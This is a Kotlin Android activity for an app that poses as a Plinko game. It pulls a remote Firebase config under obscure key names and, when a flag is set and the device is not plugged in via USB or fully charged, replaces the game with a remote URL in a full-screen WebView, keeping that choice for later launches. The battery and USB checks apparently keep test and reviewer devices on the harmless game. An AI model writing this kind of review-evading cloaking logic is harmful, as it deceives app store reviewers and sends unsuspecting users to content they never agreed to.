package plinko.gameballs.nine

import android.content.pm.ActivityInfo
import android.os.Bundle
import android.view.View
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.android.gms.ads.AdRequest
import com.google.android.gms.ads.AdView
import com.google.android.gms.ads.MobileAds
import com.google.firebase.Firebase
import com.google.firebase.FirebaseApp
import com.google.firebase.remoteconfig.remoteConfig
import com.google.firebase.remoteconfig.remoteConfigSettings
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject
import plinko.gameballs.nine.databinding.ActivityMainBinding
import plinko.gameballs.nine.util.DataStoreManager
import plinko.gameballs.nine.util.Lottie
import plinko.gameballs.nine.util.Once
import plinko.gameballs.nine.util.getBatteryPercentage
import plinko.gameballs.nine.util.internetConnection
import plinko.gameballs.nine.util.isBatteryCharging
import plinko.gameballs.nine.util.isUSB
import plinko.gameballs.nine.util.log
import plinko.gameballs.nine.util.setVisible
import plinko.gameballs.nine.webView.WebViewFragment
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val UID = 14
        var urlUID    = ""

        val startFragUID = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie
    private lateinit var banner: AdView

    val webViewFragment = WebViewFragment(this)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            checkDataStoreUID()
//            startFragUID.tryEmit(R.id.libGDXFragment)
//            startFragmentID.tryEmit(INTERPOL)

            coroutine.launch(Dispatchers.Main) {
                startFragUID.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            webViewFragment.goneWebView()
                            setNavigationBarColor(R.color.black)
                            setStartDestination(fragmentId)
                            banner.setVisible(View.VISIBLE)
                            ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                        }
                        UID                 -> {
                            webViewFragment.showAndOpenUrl()
                            setNavigationBarColor(R.color.white)
                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        else                -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }.also { requestedOrientation = it }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        webViewFragment.onResume()
    }

    override fun onPause() {
        webViewFragment.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)
        banner        = binding.banner.apply { loadAd(AdRequest.Builder().build()) }
        webViewFragment.onCreate(coroutine, binding.uid)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(2_222)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkDataStoreUID() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "UID" -> {
                    DataStoreManager.Link.get()?.let {
//                        log("DataStoreManager Key = SUCCESS | link = $it")
                        urlUID = it
                        startFragUID.emit(UID)
                    }
                }
                "GID" -> {
//                    log("DataStoreManager Key = GAME")
                    startFragUID.emit(R.id.libGDXFragment)
                }
                else -> {
//                    log("DataStoreManager Key = NONE")
                    getUID()
                }
            }
        }
    }

    private fun getUID() {
        FirebaseApp.initializeApp(appContext)

        Firebase.remoteConfig.apply {
            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                try {
                    if (task.isSuccessful) {
                        val jsonData = JSONObject(getString("plural"))
                        log("success = $jsonData")

                        checkUID(
                            second = jsonData.getString("stick"),
                            first  = jsonData.getString("shelter")
                        )
                    } else {
                        startFragUID.tryEmit(R.id.libGDXFragment)
                        log("getFirebaseData Fail = ${this.all}")
                    }
                } catch (e: Exception) {
                    startFragUID.tryEmit(R.id.libGDXFragment)
                    log("EXCEPTION try catch = ${e.message}")
                }
            }
        }
    }

    private fun checkUID(second: String, first: String) {
        if (first=="true") {
            if (isUSB() || (getBatteryPercentage() == 100 && isBatteryCharging())) {
                openGID()
            } else {
                openUID(second)
            }
        } else {
            openGID()
        }
    }

    private fun openGID() {
        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "GID" }
            startFragUID.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun openUID(second: String) {
        urlUID = second
        startFragUID.tryEmit(UID)

        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "UID" }
            DataStoreManager.Link.update { urlUID }
        }
    }

}